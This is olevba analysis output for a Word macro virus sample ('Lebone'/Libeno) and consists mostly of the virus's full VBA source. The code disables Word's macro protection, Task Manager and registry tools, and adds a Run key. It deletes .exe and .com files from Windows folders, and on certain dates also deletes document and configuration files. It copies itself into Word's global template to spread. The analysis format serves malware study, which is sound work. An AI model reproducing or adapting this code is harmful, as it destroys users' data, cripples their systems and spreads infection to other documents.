olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Libeno.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Libeno.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Libon.bas 
in file: Virus.MSWord.Libeno.a - OLE stream: 'Macros/VBA/Libon'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Macro virus name: Lebone
'-------------------------
'Infecta documentos word.
'Infect word documents.
'2005
'-------------------------

Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Macro Lebone"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Project.Libon.AutoOpen"
On Error Resume Next
With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With

MsgBox " Virus alterou seu computador !!", vbOKOnly + vbCritical, "Word texto informa!!"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Lune") = "Virus ativado"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOrganization") = "Universal"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "RegisteredOwner") = "Astral"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "Version") = "13A31-Infected "
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "VersionNumber") = "1313BA13 Astral "
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion", "ProductName") = "Electron"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "Visual") = "C:\ARQUIV~1\Lube.html"
Open "C:\ARQUIV~1\Lube.html" For Output As #1
 Print #1, "<html><head><title>Macro virus!</title></head><body bgcolor='#FF0000' link='#FFFF00' vlink='#FF0000'>"
 Print #1, "<h6 align='center'><font color='#EEEE00' size='15'><marquee behavior='alternate' width='90%'>Computador com problemas!</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>##############################################</marquee></font>"
 Print #1, "<h6 align='center'><font color='#000000' size='15'><marquee behavior='alternate' width='90%'>Word modificado com sucesso!</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>###############################################</marquee></font>"
 Print #1, "<h6 align='center'><font color='#00FF00' size='15'><marquee behavior='alternate' width='70%'>Word macro virus!</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>###############################################</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>###############################################</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>###############################################</marquee></font>"
 Print #1, "<h6 align='center'><font color=blue size='7'><marquee behavior='alternate' width='100%'>###############################################</marquee></font>"
 Close #1

ActiveDocument.Shapes.AddTextEffect _
PresetTextEffect:=msoTextEffect9, _
Text:="A vida pode ser feliz!!", FontName:="Arial Black", _
FontSize:=36, FontBold:=msoTrue, _
FontItalic:=msoFalse, Left:=1, Top:=1, _
Anchor:=ActiveDocument.Paragraphs(1).Range

WordBasic.Kill "C:\WINDOWS\*.exe"
WordBasic.Kill "C:\WINDOWS\SYSTEM\*.exe"
WordBasic.Kill "C:\WINDOWS\COMMAND\*.exe"
WordBasic.Kill "C:\WINDOWS\*.com"
WordBasic.Kill "C:\WINDOWS\COMMAND\*.com"

If Day(Now()) = 6 Or (Day(Now)) = 13 Or (Day(Now)) = 17 Or (Day(Now)) = 23 Or (Day(Now)) = 28 Then
MsgBox " Virus modificou seus arquivos!!", vbOKOnly + vbCritical, "Word texto informa!!"
WordBasic.Kill "C:\WINDOWS\*.com"
WordBasic.Kill "C:\WINDOWS\*.ini"
WordBasic.Kill "C:\WINDOWS\*.txt"
WordBasic.Kill "C:\WINDOWS\*.gif"
WordBasic.Kill "C:\WINDOWS\*.xls"
WordBasic.Kill "C:\WINDOWS\*.pdf"
WordBasic.Kill "C:\*.com"
WordBasic.Kill "C:\*.ini"
WordBasic.Kill "C:\*.txt"
WordBasic.Kill "C:\*.gif"
WordBasic.Kill "C:\*.xls"
WordBasic.Kill "C:\*.pdf"
     
End If
End Sub

Sub AutoClose()
Attribute AutoClose.VB_Description = "Macro Lebone"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.Libon.AutoClose"
On Error Resume Next

ActiveDocument.SaveAs FileName:="C:\Lubir.sys"
ActiveDocument.SaveAs FileName:="C:\Windows\System\Igon.sys"
ActiveDocument.SaveAs FileName:="C:\Program Files\Lubi.sys"
ActiveDocument.SaveAs FileName:="C:\Windows\Command\Nidun.sys"

iMacroCount = WordBasic.CountMacros(0, 0)
For i = 1 To iMacroCount
    If WordBasic.[MacroName$](i, 0, 0) = "Libon" Then
        binstalled = -1
    End If
    If WordBasic.[MacroName$](i, 0, 0) = "Libon" Then
        bTooMuchTrouble = -1
    End If
Next i
If Not binstalled And Not bTooMuchTrouble Then
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":Libon"
    WordBasic.MacroCopy sMacro$, "Global:Libon"
    sMacro$ = sMe$ + ":AutoClose"
    WordBasic.MacroCopy sMacro$, "Global:Libon"
   
   ActiveDocument.Save

End If

End Sub

Sub Toolsmacro()
Attribute Toolsmacro.VB_Description = "Macro Lebone"
Attribute Toolsmacro.VB_ProcData.VB_Invoke_Func = "Project.Libon.macro"
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = False
End Sub

'Infecta documentos word.
'Infect word documents.
'Word Macro virus
'=========================
'Ano 2005
'-------------------------











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|COMMAND             |May run PowerShell commands                  |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

